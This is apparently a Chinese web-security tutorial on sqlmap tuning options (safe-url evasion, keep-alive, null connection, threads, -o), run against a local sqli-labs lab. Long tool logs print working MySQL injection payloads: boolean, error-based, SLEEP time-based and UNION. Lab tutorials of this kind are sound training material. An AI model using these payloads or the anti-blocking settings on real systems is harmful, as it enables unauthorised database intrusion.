Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a
X-Powered-By: PHP/7.3.4
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
URI: http://127.0.0.1:80/sqli-labs/Less-1/?id=7
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6613=6613 AND 'wyLD'='wyLD
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 4185 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(4185=4185,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'aqQg'='aqQg
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4770 FROM (SELECT(SLEEP(5)))RbSZ) AND 'xahz'='xahz
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-9218' UNION ALL SELECT NULL,NULL,CONCAT(0x7176706b71,0x4e6a506169494f6c654a42614659426f70457a4f77454d4f494c415144525967626d41745067674a,0x71706a7871)-- -
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY]-- -
---
[20:08:09] [INFO] the back-end DBMS is MySQL
[20:08:09] [INFO] fetching banner
[20:08:09] [DEBUG] resuming configuration option 'string' ('Your')
[20:08:09] [DEBUG] performed 0 queries in 0.00 seconds
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[20:08:09] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:08:09 /2020-02-26/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869
```

显然，此时id为7，是随机生成的。

### 7.sqlmap中设置忽略401

如果测试站点偶尔返回HTTP错误401，而你想忽略它并在不提供适当凭证的情况下继续测试，可以使用 **--ignore-401**来忽略未验证错误。

### 8.避免错误请求过多而被屏蔽

有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量错 误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。
参数：

- –safe-url
  隔一会就访问一下的安全URL
- –safe-post
  访问安全URL时携带的POST数据
- –safe-req
  从文件中载入安全HTTP请求
- –safe-freq
  每次测试请求之后都会访问一下的安全URL

# Python全栈（五）Web安全攻防之4.sqlmap性能优化和注入技术参数

## 一、Sqlmap性能优化

### 1.sqlmap设置持久HTTP连接

sqlmap中可以设置连接为持久连接，HTTP报文中设置`connection:keep-alive`；
长连接可以减少连接开销，但是会占用服务器资源。

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --keep-alive --banner -v 5
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 17:06:39 /2020-02-29/                                                                                                                      
                                                                                                                                                          
[17:06:39] [DEBUG] cleaning up configuration parameters                                                                                                   
[17:06:40] [DEBUG] setting the HTTP timeout                                                                                                               
[17:06:40] [DEBUG] setting the HTTP User-Agent header                                                                                                     
[17:06:40] [DEBUG] creating HTTP requests opener object                                                                                                   
[17:06:40] [INFO] resuming back-end DBMS 'mysql'                                                                                                          
[17:06:40] [INFO] testing connection to the target URL                                                                                                    
[17:06:40] [TRAFFIC OUT] HTTP request [#1]:                                                                                                               
GET /sqli-labs/Less-1/?id=1 HTTP/1.1                                                                                                                      
Cache-control: no-cache                                                                                                                                   
User-agent: sqlmap/1.4.2.31#dev (http://sqlmap.org)                                                                                                       
Host: 127.0.0.1                                                                                                                                           
Accept: */*                                                                                                                                               
Accept-encoding: gzip,deflate                                                                                                                             
Connection: keep-alive                                                                                                                                    
                                                                                                                                                          
[17:06:40] [DEBUG] declared web page charset 'utf-8'                                                                                                      
[17:06:40] [TRAFFIC IN] HTTP response [#1] (200 OK):                                                                                                      
Date: Sat, 29 Feb 2020 09:06:40 GMT                                                                                                                       
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a                                                                                             
X-Powered-By: PHP/7.3.4                                                                                                                                   
Keep-Alive: timeout=5, max=100                                                                                                                            
Connection: Keep-Alive                                                                                                                                    
Transfer-Encoding: chunked                                                                                                                                
Content-Type: text/html; charset=UTF-8                                                                                                                    
URI: http://127.0.0.1:80/sqli-labs/Less-1/?id=1                                                                                                           
sqlmap resumed the following injection point(s) from stored session:                                                                                      
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=1' AND 6613=6613 AND 'wyLD'='wyLD                                                                                                         
    Vector: AND [INFERENCE]                                                                                                                               
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=1' AND (SELECT 4185 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(4185=4185,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'aqQg'='aqQg                                                                                                             
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.
PLUGINS GROUP BY x)a)                                                                                                                                     
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=1' AND (SELECT 4770 FROM (SELECT(SLEEP(5)))RbSZ) AND 'xahz'='xahz                                                                         
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])                                             
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-9218' UNION ALL SELECT NULL,NULL,CONCAT(0x7176706b71,0x4e6a506169494f6c654a42614659426f70457a4f77454d4f494c415144525967626d41745067674a,0
x71706a7871)-- -                                                                                                                                          
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY]-- -                                                                                                       
---                                                                                                                                                       
[17:06:40] [INFO] the back-end DBMS is MySQL                                                                                                              
[17:06:40] [INFO] fetching banner                                                                                                                         
[17:06:40] [DEBUG] resuming configuration option 'string' ('Your')                                                                                        
[17:06:40] [DEBUG] performed 0 queries in 0.00 seconds                                                                                                    
back-end DBMS: MySQL >= 5.0                                                                                                                               
banner: '5.7.26'                                                                                                                                          
[17:06:40] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 17:06:40 /2020-02-29/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374
```

显然，出现了`Keep-Alive: timeout=5, max=100`，假如不加参数`--keep-alive`显示的是`Connection: close`。
在使用长连接时不能设置代理，否则会出现冲突，例如：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --keep-alive --banner --proxy "http://218.18.158.216:8000" -v 5
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 17:20:32 /2020-02-29/                                                                                                                      
                                                                                                                                                          
[17:20:32] [DEBUG] cleaning up configuration parameters                                                                                                   
[17:20:32] [DEBUG] setting the HTTP timeout                                                                                                               
[17:20:32] [DEBUG] setting the HTTP User-Agent header                                                                                                     
[17:20:32] [DEBUG] setting the HTTP/SOCKS proxy for all HTTP requests                                                                                     
[17:20:32] [DEBUG] creating HTTP requests opener object                                                                                                   
[17:20:32] [WARNING] persistent HTTP(s) connections, Keep-Alive, has been disabled because of its incompatibility with HTTP(s) proxy                      
[17:20:33] [INFO] resuming back-end DBMS 'mysql'                                                                                                          
[17:20:33] [INFO] testing connection to the target URL                                                                                                    
[17:20:33] [TRAFFIC OUT] HTTP request [#1]:                                                                                                               
GET /sqli-labs/Less-1/?id=1 HTTP/1.1                                                                                                                      
Cache-control: no-cache                                                                                                                                   
User-agent: sqlmap/1.4.2.31#dev (http://sqlmap.org)                                                                                                       
Host: 127.0.0.1                                                                                                                                           
Accept: */*                                                                                                                                               
Accept-encoding: gzip,deflate                                                                                                                             
Connection: keep-alive                                                                                                                                    
                                                                                                                                                          
[17:20:34] [DEBUG] declared web page charset 'utf-8'                                                                                                      
[17:20:34] [TRAFFIC IN] HTTP response [#1] (404 Not Found):                                                                                               
Date: Sat, 29 Feb 2020 09:20:33 GMT                                                                                                                       
Content-Type: text/html; charset=utf-8                                                                                                                    
Vary: Accept-Encoding                                                                                                                                     
X-Cache: MISS from KX-S42-Web-85                                                                                                                          
X-Cache-Lookup: MISS from KX-S42-Web-85:3128                                                                                                              
Via: 1.0 KX-S42-Web-85 (squid/3.1.23)                                                                                                                     
Connection: close                                                                                                                                         
URI: http://127.0.0.1:80/sqli-labs/Less-1/?id=1                                                                                                           
[17:20:34] [CRITICAL] page not found (404)                                                                                                                
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n]                      
                                                                                                                                                          
[17:20:38] [WARNING] HTTP error codes detected during run:                                                                                                
404 (Not Found) - 1 times                                                                                                                                 
                                                                                                                                                          
[*] ending @ 17:20:38 /2020-02-29/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748
```

显示`Connection: keep-alive`，即如果设置了代理即便设为长连接还是为连接关闭，即此时设置`--keep-alive`无效。

### 2.sqlmap设置不接收HTTP Body

参数：
`--null-connection`
sqlmap中设置空连接，表示不接受HTTP当中的Body；
可以直接获得HTTP响应的大小而不用获得HTTP响应体；
常在盲注时使用，不接收HTTP Body可以降低网络带宽消耗。
在Kali中测试：

```shell
sqlmap -u http://192.168.0.103/sqli-labs/Less-1/?id=1 --null-connection --banner -v 5
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.8#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:43:01 /2020-02-29/

[17:43:01] [DEBUG] cleaning up configuration parameters
[17:43:01] [DEBUG] setting the HTTP timeout
[17:43:01] [DEBUG] setting the HTTP User-Agent header
[17:43:01] [DEBUG] creating HTTP requests opener object
[17:43:01] [INFO] resuming back-end DBMS 'mysql' 
[17:43:01] [INFO] testing connection to the target URL
[17:43:01] [TRAFFIC OUT] HTTP request [#1]:
GET /sqli-labs/Less-1/?id=1 HTTP/1.1
Host: 192.168.0.103
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.3.8#stable (http://sqlmap.org)
Connection: close

[17:43:01] [DEBUG] declared web page charset 'utf-8'
[17:43:01] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Sat, 29 Feb 2020 09:43:00 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a
X-Powered-By: PHP/7.3.4
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
URI: http://192.168.0.103:80/sqli-labs/Less-1/?id=1
[17:43:01] [INFO] testing NULL connection to the target URL
[17:43:01] [TRAFFIC OUT] HTTP request [#2]:
HEAD /sqli-labs/Less-1/?id=1 HTTP/1.1
Host: 192.168.0.103
Cache-control: no-cache
Accept-encoding: identity
Accept: */*
User-agent: sqlmap/1.3.8#stable (http://sqlmap.org)
Connection: close

[17:43:01] [TRAFFIC IN] HTTP response [#2] (200 OK):
Date: Sat, 29 Feb 2020 09:43:01 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a
X-Powered-By: PHP/7.3.4
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://192.168.0.103:80/sqli-labs/Less-1/?id=1
[17:43:01] [TRAFFIC OUT] HTTP request [#3]:
GET /sqli-labs/Less-1/?id=1 HTTP/1.1
Host: 192.168.0.103
Accept-encoding: identity
Cache-control: no-cache
Range: bytes=-1
Accept: */*
User-agent: sqlmap/1.3.8#stable (http://sqlmap.org)
Connection: close

[17:43:01] [TRAFFIC IN] HTTP response [#3] (200 OK):
Date: Sat, 29 Feb 2020 09:43:01 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a
X-Powered-By: PHP/7.3.4
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
URI: http://192.168.0.103:80/sqli-labs/Less-1/?id=1
[17:43:01] [TRAFFIC OUT] HTTP request [#4]:
GET /sqli-labs/Less-1/?id=1 HTTP/1.1
Host: 192.168.0.103
Cache-control: no-cache
Accept-encoding: identity
Accept: */*
User-agent: sqlmap/1.3.8#stable (http://sqlmap.org)
Connection: close

[17:43:01] [TRAFFIC IN] HTTP response [#4] (200 OK):
Date: Sat, 29 Feb 2020 09:43:01 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a
X-Powered-By: PHP/7.3.4
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
URI: http://192.168.0.103:80/sqli-labs/Less-1/?id=1
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5740=5740 AND 'mIdv'='mIdv
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1690 FROM(SELECT COUNT(*),CONCAT(0x71767a7a71,(SELECT (ELT(1690=1690,1))),0x716b6b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Cbli'='Cbli
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 2810 FROM (SELECT(SLEEP(5)))iZjP) AND 'aeqh'='aeqh
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-9925' UNION ALL SELECT NULL,CONCAT(0x71767a7a71,0x4f6c754f767965706a664f514845696874654a594457514e564e4a53734a75776a73535653785375,0x716b6b7871),NULL-- NsvS
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
---
[17:43:01] [INFO] the back-end DBMS is MySQL
[17:43:01] [INFO] fetching banner
[17:43:01] [DEBUG] resuming configuration option 'string' ('Your')
[17:43:01] [DEBUG] performed 0 queries in 0.00 seconds
web application technology: PHP 7.3.4, Apache 2.4.39
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[17:43:01] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.0.103'
[17:43:01] [WARNING] you haven't updated sqlmap for more than 210 days!!!

[*] ending @ 17:43:01 /2020-02-29/

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123
```

### 3.sqlmap设置多线程

参数：
`--thread`
sqlmap中设置同时发送多少个HTTP请求的多线程。
在Kali中测试：

```shell
qlmap -u http://192.168.0.103/sqli-labs/Less-1/?id=1 --thread 10 --banner -v 5
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:46:39 /2020-02-29/

[17:46:39] [DEBUG] cleaning up configuration parameters
[17:46:39] [DEBUG] setting the HTTP timeout
[17:46:39] [DEBUG] setting the HTTP User-Agent header
[17:46:39] [DEBUG] creating HTTP requests opener object
[17:46:40] [INFO] resuming back-end DBMS 'mysql' 
[17:46:40] [INFO] testing connection to the target URL
[17:46:40] [TRAFFIC OUT] HTTP request [#1]:
GET /sqli-labs/Less-1/?id=1 HTTP/1.1
Host: 192.168.0.103
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.3.8#stable (http://sqlmap.org)
Connection: close

[17:46:40] [DEBUG] declared web page charset 'utf-8'
[17:46:40] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Sat, 29 Feb 2020 09:46:39 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a
X-Powered-By: PHP/7.3.4
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
URI: http://192.168.0.103:80/sqli-labs/Less-1/?id=1
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5740=5740 AND 'mIdv'='mIdv
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1690 FROM(SELECT COUNT(*),CONCAT(0x71767a7a71,(SELECT (ELT(1690=1690,1))),0x716b6b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Cbli'='Cbli
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 2810 FROM (SELECT(SLEEP(5)))iZjP) AND 'aeqh'='aeqh
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-9925' UNION ALL SELECT NULL,CONCAT(0x71767a7a71,0x4f6c754f767965706a664f514845696874654a594457514e564e4a53734a75776a73535653785375,0x716b6b7871),NULL-- NsvS
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
---
[17:46:40] [INFO] the back-end DBMS is MySQL
[17:46:40] [INFO] fetching banner
[17:46:40] [DEBUG] resuming configuration option 'string' ('Your')
[17:46:40] [DEBUG] performed 0 queries in 0.00 seconds
web application technology: PHP 7.3.4, Apache 2.4.39
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[17:46:40] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.0.103'
[17:46:40] [WARNING] you haven't updated sqlmap for more than 210 days!!!

[*] ending @ 17:46:40 /2020-02-29/

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071
```

很快便探测结束，可能是因为有缓存，在 **/root/.sqlmap/output/192.168.0.103**目录下，删除后再次测试。

```shell
qlmap -u http://192.168.0.103/sqli-labs/Less-1/?id=1 --thread 10 --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:52:01 /2020-02-29/

[17:52:01] [INFO] testing connection to the target URL
[17:52:01] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:52:01] [INFO] testing if the target URL content is stable
[17:52:02] [INFO] target URL content is stable
[17:52:02] [INFO] testing if GET parameter 'id' is dynamic
[17:52:02] [INFO] GET parameter 'id' appears to be dynamic
[17:52:02] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[17:52:02] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[17:52:02] [INFO] testing for SQL injection on GET parameter 'id'
[17:52:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'ing provided level (1) and risk (1) values? [Y/n] 
[17:52:05] [WARNING] reflective value(s) found and filtering out
[17:52:05] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[17:52:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:52:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:52:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:52:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:52:05] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:52:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:52:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:52:05] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[17:52:05] [INFO] testing 'MySQL inline queries'
[17:52:05] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[17:52:05] [WARNING] time-based comparison requires larger statistical model, please wait........ (done)                            
[17:52:05] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[17:52:05] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[17:52:05] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[17:52:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[17:52:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[17:52:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:52:15] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[17:52:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:52:15] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:52:15] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:52:15] [INFO] target URL appears to have 3 columns in query
[17:52:15] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5685=5685 AND 'zDwo'='zDwo

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3544 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(3544=3544,1))),0x7176787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HmJC'='HmJC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 2801 FROM (SELECT(SLEEP(5)))aNGQ) AND 'JWiB'='JWiB

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7025' UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x6355614c635050625177414166564173496f6c6558686978795257636b647a4b465a634b4a724275,0x7176787671),NULL-- ImLs
---
[17:52:17] [INFO] the back-end DBMS is MySQL
[17:52:17] [INFO] fetching banner
web application technology: PHP 7.3.4, Apache 2.4.39
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[17:52:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.0.103'
[17:52:17] [WARNING] you haven't updated sqlmap for more than 210 days!!!

[*] ending @ 17:52:17 /2020-02-29/


12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576
```

### 4.一键优化

参数：

`-o`
添加此参数相当于同时添加下列三个优化参数：

- `--keep-alive`
- `--null-connection`
- `--threads=3`

进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -o --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:10:58 /2020-02-29/

[18:10:59] [INFO] testing connection to the target URL
[18:10:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:10:59] [INFO] testing NULL connection to the target URL
[18:10:59] [INFO] testing if the target URL content is stable
[18:10:59] [INFO] target URL content is stable
[18:10:59] [INFO] testing if GET parameter 'id' is dynamic
[18:10:59] [INFO] GET parameter 'id' appears to be dynamic
[18:10:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[18:10:59] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[18:10:59] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[18:11:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:11:01] [WARNING] reflective value(s) found and filtering out
[18:11:01] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[18:11:01] [INFO] testing 'Generic inline queries'
[18:11:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:11:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:11:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:11:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:11:01] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:11:01] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
